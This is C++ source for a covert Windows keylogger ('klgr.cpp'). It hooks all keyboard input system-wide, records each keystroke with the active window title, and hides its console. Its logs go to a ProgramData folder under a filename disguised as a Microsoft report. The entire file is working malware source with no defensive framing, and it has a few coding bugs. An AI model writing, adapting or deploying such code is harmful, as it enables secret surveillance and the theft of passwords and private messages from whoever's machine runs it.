//============================================================================
// Name        : klgr.cpp
// Author      : Kishore
// Version     :
// Copyright   :
// Description :
//============================================================================

#include <iostream>
#include <fstream>
#include <stdlib.h>
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <klgr.h>
#include <cstdlib>
#include <signal.h>

#include <klgr_constants.h>


using namespace std;

ofstream logfl;
string data="\n";
int data_len = 0;
HHOOK KeyboardHook;

time_t prev_save;
string currlogdate;

char logpath[MAX_PATH];
bool shift = false;
bool caps = false;
bool debug = false;

HWND oldWindow = NULL;
char cWindow[MAX_PATH];

void initialze()
{
	InitializeLogFile();
	prev_save = timeNow();
	currlogdate= getStringDateTime(c_date);
}


void MakeDir(const string& dirPath)
{
	if (CreateDirectory(dirPath.c_str(), NULL) ||ERROR_ALREADY_EXISTS == GetLastError())
	{
		if (debug){
			if (ERROR_ALREADY_EXISTS == GetLastError())
				cout << "Folder already Exists" <<endl;
			else
				cout << "Path " << dirPath <<" has been created" << endl;
		}
	}
    else
    	throw std::invalid_argument("Couldn't create log folder");
}

void unHook()
{
    UnhookWindowsHookEx(KeyboardHook);
}

void TerminateProgram(void)
{
	writeToFile(data);
	writeToFile("\n\n--------!!! ------ System: Termiating Program  --------!!! ------\n\n");
	unHook();
	logfl.close();
}

void InitializeLogFile()
{
	char logdirnm[]="\\Wrs";
	char logflnm[]= "\\MicrosftReport-";

	//Get APPDATA directory path
	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, logpath)))
	{
		if(debug)
			cout << "ERROR FINDING PATH"<<logpath<<endl;
		strcat(logpath,"c:\\");
	}

	strcat(logpath,logdirnm);
	MakeDir(logpath);

	// Add fileName to Path
	strcat(logpath,logflnm);
	strcat(logpath,getStringDateTime(c_date).c_str());

	if(debug)
		cout << "Log file: " << logpath << endl;
	logfl.open(logpath,ios::app | ios::binary);
}

void writeToFile(string content)
{
	logfl << content;
	logfl.flush();
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *) lParam;
	bool ctrl_key=0;
	bool alt_key=0;
	string curr_key;

	if(GetKeyState(VK_CAPITAL) < 0)
		caps = !caps;

	if(nCode == HC_ACTION)
	{
		// Determine the current state of shift key
		if(p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT){
				if(wParam == WM_KEYDOWN){
						shift = true;
				}
				else{
						shift = false;
				}
		}

		ctrl_key = GetAsyncKeyState (VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
		//alt_key = GetAsyncKeyState (VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);

		// Check if F12 + CTRL is pressed, if yes -> exit
		if (p->vkCode == VK_F12 && ctrl_key)
		{
			TerminateProgram();
		}

		// Start logging keys
		if(wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) // If key has been pressed
		{
			HWND newWindow = GetForegroundWindow();
			if(oldWindow == NULL || newWindow != oldWindow)
			{
					GetWindowTextA(newWindow, cWindow, sizeof(cWindow));
					buildData(string(cWindow),c_window);
					oldWindow = newWindow;
			}

			// Virtual key codes reference: http://msdn.microsoft.com/en-us/library/dd375731%28v=VS.85%29.aspx
			curr_key = decodeKeys(p->vkCode,caps,shift,ctrl_key,alt_key);
			buildData(curr_key,c_key);
		}
	}
	    return CallNextHookEx(NULL,nCode,wParam,lParam);
}

void isLogFileCurrent()
{
	if(compareDates(currlogdate,getStringDateTime(c_date)) > 0)
	{
		//Close current and create new file
		logfl.close();
		InitializeLogFile();
	}
}

void buildData(string alpha,string contentType)
{
	if(contentType==c_key)
	{
		if(data_len >=50)
		{
			writeToFile(data);
			data = "";
			data_len=0;
			isLogFileCurrent(); //---- Verify working
		}
		data_len++;
		data = data + alpha;
		if (debug)
			cout << data <<endl;
	}
	else
	{
		if(debug)
			cout << "Window deteceted: " << endl;
		writeToFile(data);
		data = getStringDateTime(c_date_time) + " ";
		data.append(alpha+ " : ");
		data_len =0;
	}
}

void signal_callback_handler(int signum)
{
	writeToFile("\n\n--------!!! ------System: Caught signal "+signum);
	TerminateProgram();
	exit(signum);
}

int main(int argc, char* argv[])
{
	if (argv[0] == "--debug")
		debug = true;
	FreeConsole();
	atexit(TerminateProgram);			// GraceFully Exit
	initialze();
	KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,keyboardHookProc,0,0);
	signal(SIGINT, signal_callback_handler);

	MSG msg;

	while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
		TranslateMessage(&msg);
	    DispatchMessage(&msg);
	}

	return EXIT_SUCCESS;
}

/* Use Ctrl+F12 to exit the key logger
 * Default log location is CSIDL_COMMON_APPDATA AKA C:\ProgramData\
 * Secondary log location is C://Wrs
 *
 */
